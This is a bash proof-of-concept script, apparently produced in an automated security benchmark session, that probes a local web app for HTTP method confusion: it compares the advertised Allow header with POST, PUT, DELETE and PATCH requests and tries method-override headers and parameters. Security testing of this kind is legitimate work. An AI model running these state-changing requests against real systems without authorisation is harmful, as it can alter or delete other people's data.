#!/bin/bash
# POC: Demonstrates HTTP Method Confusion - Allow header mismatch where POST, PUT, DELETE, and PATCH methods work despite Allow header claiming only GET is permitted. Also demonstrates method override via X-HTTP-Method-Override header.
# Target: ./repo
# Created: 2025-11-07T21:56:19.689Z
# Session: benchmark-XBEN-077-24-mhpdz86a

# HTTP Method Confusion POC
# Tests mismatch between Allow header and actually allowed methods
# Also tests method override headers

TARGET_URL="${1:-http://localhost:3000/}"
RESULTS_FILE="/tmp/method_confusion_results.txt"

echo "=========================================="
echo "HTTP Method Confusion - Allow Header Mismatch POC"
echo "=========================================="
echo "Target: $TARGET_URL"
echo ""

# Clean up results file
> "$RESULTS_FILE"

# Test 1: OPTIONS to check advertised allowed methods
echo "[TEST 1] OPTIONS request - Check advertised allowed methods"
echo "Command: curl -s -i \"$TARGET_URL\" -X OPTIONS" >> "$RESULTS_FILE"
RESPONSE=$(curl -s -i "$TARGET_URL" -X OPTIONS)
echo "$RESPONSE" >> "$RESULTS_FILE"
ALLOW_HEADER=$(echo "$RESPONSE" | grep -i "^Allow:" | head -1)
echo "Allow Header: $ALLOW_HEADER"
echo "Allow Header: $ALLOW_HEADER" >> "$RESULTS_FILE"
echo "" >> "$RESULTS_FILE"
echo ""

# Test 2: POST request - Should fail if Allow header is respected, but let's test
echo "[TEST 2] POST request - Testing if POST is actually allowed"
echo "Command: curl -s -i \"$TARGET_URL\" -X POST -H \"Content-Type: application/x-www-form-urlencoded\" -d \"name=Test&surname=User&address=123\"" >> "$RESULTS_FILE"
RESPONSE=$(curl -s -i "$TARGET_URL" -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=Test&surname=User&address=123")
HTTP_CODE=$(echo "$RESPONSE" | head -1)
echo "$RESPONSE" >> "$RESULTS_FILE"
echo "HTTP Response: $HTTP_CODE"
echo "HTTP Response: $HTTP_CODE" >> "$RESULTS_FILE"
if echo "$HTTP_CODE" | grep -q "200\|201"; then
  echo "✓ POST request ACCEPTED (Method Confusion: Allow header says GET only, but POST works)"
  CONFUSION_DETECTED=1
else
  echo "✗ POST request rejected"
fi
echo "" >> "$RESULTS_FILE"
echo ""

# Test 3: PUT request
echo "[TEST 3] PUT request - Testing if PUT is actually allowed"
echo "Command: curl -s -i \"$TARGET_URL\" -X PUT -H \"Content-Type: application/x-www-form-urlencoded\" -d \"name=Test&surname=User&address=123\"" >> "$RESULTS_FILE"
RESPONSE=$(curl -s -i "$TARGET_URL" -X PUT \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=Test&surname=User&address=123")
HTTP_CODE=$(echo "$RESPONSE" | head -1)
echo "$RESPONSE" >> "$RESULTS_FILE"
echo "HTTP Response: $HTTP_CODE"
if echo "$HTTP_CODE" | grep -q "200\|201"; then
  echo "✓ PUT request ACCEPTED (Method Confusion detected)"
  CONFUSION_DETECTED=1
else
  echo "✗ PUT request rejected"
fi
echo "" >> "$RESULTS_FILE"
echo ""

# Test 4: DELETE request
echo "[TEST 4] DELETE request - Testing if DELETE is actually allowed"
echo "Command: curl -s -i \"$TARGET_URL\" -X DELETE" >> "$RESULTS_FILE"
RESPONSE=$(curl -s -i "$TARGET_URL" -X DELETE)
HTTP_CODE=$(echo "$RESPONSE" | head -1)
echo "$RESPONSE" >> "$RESULTS_FILE"
echo "HTTP Response: $HTTP_CODE"
if echo "$HTTP_CODE" | grep -q "200\|201"; then
  echo "✓ DELETE request ACCEPTED (Method Confusion detected)"
  CONFUSION_DETECTED=1
else
  echo "✗ DELETE request rejected"
fi
echo "" >> "$RESULTS_FILE"
echo ""

# Test 5: PATCH request
echo "[TEST 5] PATCH request - Testing if PATCH is actually allowed"
echo "Command: curl -s -i \"$TARGET_URL\" -X PATCH -H \"Content-Type: application/x-www-form-urlencoded\" -d \"name=Test&surname=User&address=123\"" >> "$RESULTS_FILE"
RESPONSE=$(curl -s -i "$TARGET_URL" -X PATCH \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=Test&surname=User&address=123")
HTTP_CODE=$(echo "$RESPONSE" | head -1)
echo "$RESPONSE" >> "$RESULTS_FILE"
echo "HTTP Response: $HTTP_CODE"
if echo "$HTTP_CODE" | grep -q "200\|201"; then
  echo "✓ PATCH request ACCEPTED (Method Confusion detected)"
  CONFUSION_DETECTED=1
else
  echo "✗ PATCH request rejected"
fi
echo "" >> "$RESULTS_FILE"
echo ""

# Test 6: Method Override via X-HTTP-Method-Override header
echo "[TEST 6] POST with X-HTTP-Method-Override: DELETE header"
echo "Command: curl -s -i \"$TARGET_URL\" -X POST -H \"X-HTTP-Method-Override: DELETE\" -d \"name=Test&surname=User&address=123\"" >> "$RESULTS_FILE"
RESPONSE=$(curl -s -i "$TARGET_URL" -X POST \
  -H "X-HTTP-Method-Override: DELETE" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=Test&surname=User&address=123")
HTTP_CODE=$(echo "$RESPONSE" | head -1)
echo "$RESPONSE" >> "$RESULTS_FILE"
echo "HTTP Response: $HTTP_CODE"
if echo "$HTTP_CODE" | grep -q "200\|201"; then
  echo "✓ Method Override ACCEPTED (X-HTTP-Method-Override: DELETE works)"
  METHOD_OVERRIDE_DETECTED=1
else
  echo "✗ Method Override rejected"
fi
echo "" >> "$RESULTS_FILE"
echo ""

# Test 7: Method Override via _method query parameter
echo "[TEST 7] POST with _method=DELETE query parameter"
echo "Command: curl -s -i \"${TARGET_URL}?_method=DELETE\" -X POST -d \"name=Test&surname=User&address=123\"" >> "$RESULTS_FILE"
RESPONSE=$(curl -s -i "${TARGET_URL}?_method=DELETE" -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=Test&surname=User&address=123")
HTTP_CODE=$(echo "$RESPONSE" | head -1)
echo "$RESPONSE" >> "$RESULTS_FILE"
echo "HTTP Response: $HTTP_CODE"
if echo "$HTTP_CODE" | grep -q "200\|201"; then
  echo "✓ Method Override via _method parameter ACCEPTED"
  METHOD_OVERRIDE_DETECTED=1
else
  echo "✗ Method Override via _method parameter rejected"
fi
echo "" >> "$RESULTS_FILE"
echo ""

# Summary
echo "=========================================="
echo "SUMMARY"
echo "=========================================="
if [ "$CONFUSION_DETECTED" = "1" ] && [ "$METHOD_OVERRIDE_DETECTED" = "1" ]; then
  echo "✓ HTTP METHOD CONFUSION VULNERABILITY CONFIRMED"
  echo "  - Allow header mismatch detected"
  echo "  - Method override headers detected"
  exit 0
elif [ "$CONFUSION_DETECTED" = "1" ]; then
  echo "✓ HTTP METHOD CONFUSION DETECTED (Allow header mismatch)"
  exit 0
elif [ "$METHOD_OVERRIDE_DETECTED" = "1" ]; then
  echo "✓ METHOD OVERRIDE DETECTED"
  exit 0
else
  echo "✗ No HTTP method confusion detected"
  exit 1
fi